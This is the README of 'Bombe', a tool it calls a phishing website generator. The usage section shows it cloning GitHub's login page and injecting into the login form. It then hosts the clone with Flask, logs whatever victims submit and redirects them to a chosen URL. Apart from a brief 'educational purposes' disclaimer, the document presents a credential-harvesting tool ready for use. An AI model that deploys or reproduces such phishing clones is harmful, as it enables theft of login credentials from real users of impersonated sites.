# Bombe: Phishing Website Generator
⛔ **DISCLAIMER:** this software was made only for educational purposes.
Please, don't use it un-ethically. I'm not responsible for any consequences.

📔 **NOTE:** Bombe works for simple action based HTML forms.

## Usage
To generate the malicious HTML file:
```html
$ python bombe.py
Website to clone (include protocol & route): https://github.com/login
Found 1 form actions:
[1]           <!-- '"` --><!-- </textarea></xmp> --></option></form><form data-turbo="false" action="/session" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="QwS6Zrk33Q2UoNEDPM9Qe95CM2Anioy0OEmvkwy7khYoXkkT-zY36SEcvuztmAUjo034R0NQ2HTGAI5uBpB3rw" />  <label for="login_field">
Select a form to inject (numbered): 1
```
To host the webapp (via Flask):
```
$ python webserver.py <REDIRECT_URL>
```
_**<REDIRECT_URL>** — The website which we want to redirect to after we logged the data_